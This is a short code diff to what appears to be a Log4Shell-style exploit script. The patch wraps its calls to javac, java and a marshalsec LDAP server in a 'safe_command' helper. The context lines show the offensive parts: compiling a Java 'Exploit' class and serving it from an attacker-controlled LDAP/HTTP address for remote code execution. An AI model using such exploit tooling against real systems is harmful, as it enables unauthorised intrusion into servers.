@@ -7,6 +7,7 @@ import threading
 from pathlib import Path
 import os
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+from security import safe_command
 
 CUR_FOLDER = Path(__file__).parent.resolve()
 
@@ -59,7 +60,7 @@ public class Exploit {
 
     try:
         p.write_text(program)
-        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
+        safe_command.run(subprocess.run, [os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
     except OSError as e:
         print(Fore.RED + f'[-] Something went wrong {e}')
         raise e
@@ -83,7 +84,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
 
 def check_java() -> bool:
-    exit_code = subprocess.call([
+    exit_code = safe_command.run(subprocess.call, [
         os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
@@ -95,7 +96,7 @@ def ldap_server(userip: str, lport: int) -> None:
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
-    subprocess.run([
+    safe_command.run(subprocess.run, [
         os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
         "-cp",
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
